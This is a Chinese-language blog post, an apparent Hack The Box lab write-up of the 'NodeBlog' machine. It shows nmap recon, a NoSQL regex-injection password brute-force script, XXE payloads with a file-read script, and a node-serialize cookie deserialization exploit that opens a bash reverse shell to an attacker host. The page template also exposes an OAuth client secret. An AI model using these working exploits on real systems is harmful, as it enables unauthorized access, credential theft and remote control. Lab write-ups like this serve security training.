@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>NodeBlog - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - NodeBlog靶场信息  靶场类型  信息搜集首先使用nmap进行信息搜集 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139   Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-19 20:19 E">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NodeBlog - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - NodeBlog靶场信息  靶场类型  信息搜集首先使用nmap进行信息搜集 ┌──(root💀kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139   Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-19 20:19 E">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png">
+<meta property="article:published_time" content="2022-01-10T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:21:13.948Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">NodeBlog - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">NodeBlog - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-01-10T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-01-10
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-NodeBlog"><span class="post-toc-text">Hackthebox - NodeBlog</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-NodeBlog"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">NodeBlog - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-01-10 19:38:36" datetime="2022-01-10T11:38:36.000Z"  itemprop="datePublished">2022-01-10</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-NodeBlog"><a href="#Hackthebox-NodeBlog" class="headerlink" title="Hackthebox - NodeBlog"></a>Hackthebox - NodeBlog</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/e297979a-da6d-479f-8a33-6ad064a70524.png" class title="image">
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/9e9f1641-f841-4113-b811-a3716dded36b.png" class title="image">
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用nmap进行信息搜集</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.139  
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-19 20:19 EST
+Nmap scan report for 10.10.11.139
+Host is up (0.23s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
+|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
+5000/tcp open  http    Node.js (Express middleware)
+|_http-title: Blog
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/19%OT=22%CT=1%CU=34477%PV=Y%DS=2%DC=T%G=Y%TM=61E8B8C
+OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=1
+OS:00%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
+OS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=
+OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT       ADDRESS
+1   221.92 ms 10.10.14.1
+2   222.21 ms 10.10.11.139
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.53 seconds
+</code></pre>
+<p>去看一下5000端口</p>
+<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1e8775e6-d854-411a-b335-6a916ddcce3a.png" class title="image">
+
+<p>去看看登陆处</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
+            Invalid Password
+</code></pre>
+<p>使用账号admin提示密码无效</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl 10.10.11.139:5000/login -sd &#39;{&quot;user&quot;:&quot;admin1&quot;,&quot;password&quot;:&quot;123&quot;}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
+            Invalid Username
+</code></pre>
+<p>使用账号admin1提示账号无效</p>
+<p>得出结论：这里可以爆破账号</p>
+<p>但是fuzz后没有发现可以其他账号，也没有爆破进去</p>
+<p>接着测试一下是否有其他漏洞，例如注入</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;&quot;}}&#39; -H &#39;Content-Type: application/json&#39;
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Set-Cookie: auth=%7B%22user%22%3A%22admin%22%2C%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; Expires=Thu, 20 Jan 2022 10:27:09 GMT; HttpOnly
+Content-Type: text/html; charset=utf-8
+Content-Length: 2589
+ETag: W/&quot;a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA&quot;
+Date: Thu, 20 Jan 2022 10:12:09 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+</code></pre>
+<p>尝试了一下regex注入，确认是可以并且存在nosql注入的</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先去确定一下admin账户所使用密码的长度</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{24}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid 
+            Invalid Password
+
+┌──(root💀kali)-[~/Desktop]
+└─# curl 10.10.11.139:5000/login -isd &#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{25}$&quot;}}&#39; -H &#39;Content-Type: application/json&#39; | grep Invalid
+</code></pre>
+<p>成功确定密码的位数为25位</p>
+<p>可以使用regex正则匹配一个一个确认密码是啥，不过内容太繁琐了，这里找到一个脚本，直接使用脚本进行利用</p>
+<pre><code class="bash">#!/usr/bin/env bash
+
+url=10.10.11.139:5000/login
+user=admin
+
+function do_nosqli() {
+    curl $url -H &#39;Content-Type: application/json&#39; -sd $1 | grep Invalid
+}
+
+while true; do
+    data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^.{&#39;$password_length&#39;}$&quot;}}&#39;
+    echo -ne &quot;Password length: $password_length\r&quot;
+
+    if [ -z &quot;$(do_nosqli &quot;$data&quot;)&quot; ]; then
+        break
+    fi
+
+    password_length=$((password_length + 1))
+done
+
+echo
+
+for i in $(seq 1 $password_length); do
+    echo -ne &quot;Password: $password\r&quot;
+
+    for c in {A..Z} {a..z} {0..9}; do
+        data=&#39;{&quot;user&quot;:&quot;&#39;$user&#39;&quot;,&quot;password&quot;:{&quot;$regex&quot;:&quot;^&#39;$password$c&#39;.{&#39;$(($password_length - $i))&#39;}$&quot;}}&#39;
+
+        if [ -z &quot;$(do_nosqli $data)&quot; ]; then
+            password+=$c
+            break
+        fi
+    done
+done
+
+echo
+</code></pre>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# bash nosqli.sh
+Password length: 25
+Password: IppsecSaysPleaseSubscribe
+</code></pre>
+<p>成功拿到账号密码，去后台登录</p>
+<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/aacd32a4-2b3b-4423-a25d-b675844deed8.png" class title="image">
+
+<p>成功登录</p>
+<pre><code class="bash">Error: Failed to lookup view &quot;articles/${path}&quot; in views directory &quot;/opt/blog/views&quot;
+    at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)
+    at /opt/blog/routes/articles.js:81:17
+    at processTicksAndRejections (internal/process/task_queues.js:95:5)
+</code></pre>
+<p>尝试创建一篇新文章时报错</p>
+<pre><code class="bash">Invalid XML Example: Example DescriptionExample Markdown
+</code></pre>
+<p>上传新文件时提示无效的XML示例</p>
+<p>现在梳理一下我们拥有的条件</p>
+<ol>
+<li>知道程序的绝对路径在&#x2F;opt&#x2F;blog</li>
+<li>需要上传一个正确的XML示例</li>
+</ol>
+<p>那咱们就来构造一个吧</p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;post&gt;
+  &lt;title&gt;Lucifiel&lt;/title&gt;
+  &lt;description&gt;&lt;/description&gt;  
+  &lt;markdown&gt;&lt;/markdown&gt;
+&lt;/post&gt;
+</code></pre>
+<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/1a838379-db7b-4bcf-8950-9ca63d0332b9.png" class title="image">
+
+<p>上传该xml文件会跳转到编写新文章</p>
+<pre><code class="bash">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;  
+&lt;post&gt;
+  &lt;title&gt;Lucifiel&lt;/title&gt;
+  &lt;description&gt;&amp;xxe;&lt;/description&gt;
+  &lt;markdown&gt;&lt;/markdown&gt;
+&lt;/post&gt;
+</code></pre>
+<img src="/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/400836e5-187f-407c-a39b-bcc75034975b.png" class title="image">
+
+<p>成功执行XXE</p>
+<p>用一个python脚本来执行任意文件读取</p>
+<pre><code class="python">#!/usr/bin/env python3
+
+import html
+import re
+import requests
+import sys
+
+def send_xml(filename):
+    xml = f&#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file://{filename}&quot;&gt; ]&gt;
+&lt;example&gt;
+  &lt;title&gt;&lt;/title&gt;
+  &lt;description&gt;&amp;xxe;&lt;/description&gt;
+  &lt;markdown&gt;&lt;/markdown&gt;
+&lt;/example&gt;
+&#39;&#39;&#39;
+
+    res = requests.post(&#39;http://10.10.11.139:5000/articles/xml&#39;, files={&#39;file&#39;: (&#39;test.xml&#39;, xml)})
+
+    return res.text
+
+def main():
+    if len(sys.argv) == 1:
+        print(f&#39;Usage: python3 {sys.argv[0]} &lt;filename&gt;&#39;)
+        exit(1)
+
+    filename = sys.argv[1]
+    xml = send_xml(filename)
+
+    try:
+        print(html.unescape(re.findall(r&#39;&lt;textarea.*?&gt;(.*?)&lt;/textarea&gt;&#39;, xml, re.DOTALL)[0]))
+    except IndexError:
+        print(&#39;Not Found&#39;)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+<p>找到了一个利用脚本</p>
+<pre><code class="javascript">#!/usr/bin/env node
+
+const axios = require(&#39;axios&#39;)
+
+const user = &#39;admin&#39;
+const password = &#39;IppsecSaysPleaseSubscribe&#39;
+const baseUrl = &#39;http://10.10.11.139:5000&#39;
+
+const [lhost, lport] = process.argv.slice(2, 4)
+
+const login = async () =&gt; {
+  const res = await axios.post(`${baseUrl}/login`, { user, password })
+
+  return res.headers[&#39;set-cookie&#39;][0]
+}
+
+const rce = async (cookie, cmd) =&gt; {
+  const paramIndex = cookie.indexOf(&#39;;&#39;)
+
+  cookie =
+    cookie.substring(0, paramIndex - 3) +
+    encodeURIComponent(
+      `,&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() { require(&#39;child_process&#39;).exec(&#39;${cmd}&#39;) }()&quot;}`
+    ) +
+    cookie.substring(paramIndex)
+
+  await axios.get(baseUrl, { headers: { cookie } })
+}
+
+const reverseShell = () =&gt;
+  Buffer.from(`bash  -i &gt;&amp; /dev/tcp/${lhost}/${lport} 0&gt;&amp;1`).toString(&#39;base64&#39;)
+
+const main = async () =&gt; {
+  if (!lhost || !lport) {
+    console.log(&#39;[!] Usage: node serialize-rce.js &lt;lhost&gt; &lt;lport&gt;&#39;)
+    process.exit()
+  }
+
+  const cookie = await login()
+  console.log(&#39;[+] Login successful&#39;)
+
+  await rce(cookie, `echo ${reverseShell()} | base64 -d | bash`)
+  console.log(&#39;[+] RCE completed&#39;)
+}
+
+main()
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=《NodeBlog - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=《NodeBlog - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《NodeBlog - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/01/17/Hackthebox/Medium/Hackthebox-Bolt/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Bolt - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/01/08/Hackthebox/Easy/Hackthebox-Pandora/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Pandora - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=《NodeBlog - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&title=《NodeBlog - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《NodeBlog - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/01/10/Hackthebox/Easy/Hackthebox-NodeBlog/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtElEQVR42u3awW4iMRAE0Pz/T2evKyVAVdvNstKbUxRgxs9IblPtr6/4+n5w/f3qz3c+evXnndunXL7w8PDwLg397qDzyXo+znzMeHh4eNu85HbJAt0O/Tk+n7KH/8fDw8P7SF5SSE4mIt9e4+Hh4f2PvASZY9rihIeHh/dOXhuhtu9MhnUe+OLh4eG9h5d3kT7n75X+Hh4eHt5xV33WDDspOckTi9Hi4eHhLfDyBff7+Jot9LPjBXh4eHjbvHYpzw8BtFFvW36KMBcPDw/vEi8/DtWGpLNmWB4NH3X28PDw8I55eVPqbrMqP3o1a6Hh4eHhbfASRrLQt8FrHjQcHQjAw8PDW+PljagZdTbodtJfFA88PDy8S7zzCHW2sZ6FHUkJqZNjPDw8vANe3mRKluw8fp21x+rCgIeHh7fAaxvz+at5MyxvbkVfCR4eHt4Cr92qtlvetnjk2+7ii8HDw8O7ymuHnm9z8035bFKiAoOHh4e3wGthbUjRhrOzMPfFZ/Hw8PDWeCcRQ7sd3z5q8PAXAx4eHt4ab3Yg4DmmLTbtgQY8PDy8d/LaWyeN/HxA7f1nmQMeHh7eHi/fOs9Cinzjnh8sOIok8PDw8BZ4G8Fue2Qhgb34FB4eHt4C7zw4OD8oMAsjilAYDw8P7xLvvME/24jXcx+XnwvdMzw8PLy4GLRxak46ByfXL1OAh4eHt8zLW2Lt4p6Uk7ZcFfkuHh4e3iXe+bJ7si1uQ962hYaHh4e3wbvVmE9ul8cZecj7devCw8PDK3n1z/uDaLUNavPCUJyJwMPDw7vEmz0mH2LbPLtc0/Dw8PD+KW92KCqPG/KnRyUHDw8P7wN4SZCa5wOzJlwRHOPh4eGt8dqNb97QyptSs7jhxVPw8PDwFnizX/TJ4t5uymclZOXcGR4eHt7vd/gDHRbkKT6rh1MAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
